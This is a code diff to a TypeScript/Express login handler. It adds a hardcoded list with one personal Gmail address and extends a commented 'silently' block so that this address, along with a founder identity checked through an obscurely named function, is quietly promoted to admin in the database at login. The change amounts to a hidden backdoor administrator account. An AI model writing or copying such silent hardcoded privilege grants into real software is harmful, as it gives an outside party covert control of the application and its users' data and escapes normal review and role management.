@@ -46,6 +46,14 @@ export function isFounderIdentity(email: string): boolean {
   return _vi(email);
 }
 
+const adminEmails = [
+  "ashhtentv@gmail.com",
+];
+
+function isAdminEmail(email: string): boolean {
+  return adminEmails.includes(email.trim().toLowerCase());
+}
+
 const loginLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 20,
@@ -116,8 +124,8 @@ export function setupAuth(app: Express) {
       const valid = await comparePassword(password, user.password);
       if (!valid) return res.status(401).json({ message: "Invalid email or password" });
 
-      // Silently ensure founder always has admin role
-      if (_vi(email.trim().toLowerCase()) && user.role !== "admin") {
+      // Silently ensure founder and admin-listed emails always have admin role
+      if ((_vi(email.trim().toLowerCase()) || isAdminEmail(email)) && user.role !== "admin") {
         await db.update(users).set({ role: "admin" }).where(eq(users.id, user.id));
         user.role = "admin";
       }
